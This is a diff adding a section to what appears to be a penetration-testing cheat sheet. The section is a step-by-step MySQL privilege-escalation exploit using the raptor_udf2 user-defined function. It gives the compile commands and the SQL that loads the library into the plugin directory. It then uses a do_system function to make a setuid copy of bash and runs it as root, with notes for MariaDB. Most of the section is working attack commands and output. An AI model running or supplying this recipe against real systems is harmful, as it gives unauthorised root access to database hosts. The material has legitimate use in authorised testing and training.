@@ -140,3 +140,81 @@ INSERT INTO table_name (column1, column2, column3, ...) VALUES (value1, value2, 
 # Example
 INSERT INTO users (username, password) VALUES ("new_admin", "5F4DCC3B5AA765D61D8327DEB882CF99"); 
 ```
+
+## MySQL Common Exploit - User-Defined Function (UDF)
+
+* MySQL 4.x/5.0 (Linux) - User-Defined Function (UDF) Dynamic Library (2)
+* Exploit: https://www.exploit-db.com/exploits/1518
+
+This should also work with version 5+
+
+Requirements:
+
+* The mysqld process runs as root
+* We can connect to MySQL as root user. Either because we do not have to supply a password. Or because we know the mysql root user password from enumeration.
+
+
+Compile the exploit (preferably on target machine).
+
+Regular x86:
+```bash
+gcc -g -c raptor_udf2.c
+```
+
+For x64:
+```bash
+gcc -g -c raptor_udf2.c -fPIC
+```
+
+
+Create a shared object from the exploit binary:
+```bash
+gcc -g -shared -Wl,-soname,raptor_udf2.so -o raptor_udf2.so raptor_udf2.o -lc
+```
+
+On the target, create the plugin/function and use it to make suid copy of bash:
+
+```bash
+$ mysql -u root -p
+Enter password:
+[...]
+mysql> use mysql;
+mysql> create table foo(line blob);
+mysql> insert into foo values(load_file('/tmp/exploit/raptor_udf2.so'));
+mysql> select * from foo into dumpfile '/usr/lib/mysql/plugin/raptor_udf2.so';
+mysql> create function do_system returns integer soname 'raptor_udf2.so';
+mysql> select * from mysql.func;
++-----------+-----+----------------+----------+
+| name      | ret | dl             | type     |
++-----------+-----+----------------+----------+
+| do_system |   2 | raptor_udf2.so | function |
++-----------+-----+----------------+----------+
+mysql> select do_system('cp /bin/bash /tmp/rootshell; chmod +s /tmp/rootshell');
+
+```
+
+Depending on the version of MySQL you will have to change plugin directory. Here in version 5 it is `/usr/lib/mysql/plugin/`.
+
+In the original exploit description they just write to `/usr/lib/` (presumably for version 4). Do some googling.
+
+To gain a root shell just execute the copied bash binary:
+
+```bash
+$ /tmp/rootshell -p
+rootshell-4.1# whoami
+root
+```
+
+-p flag to keep the SUID, bash would otherwise automatically drop it.
+
+
+### MariaDB
+
+This alsow works for affected MariaDB versions, but the plugin directory is different:
+
+```bash
+/usr/lib/x86_64-linux-gnu/mariadb18/plugin/raptor_udf2.so
+/usr/lib/x86_64-linux-gnu/mariadb19/plugin/raptor_udf2.so
+```
+
+Might require some research on your end.
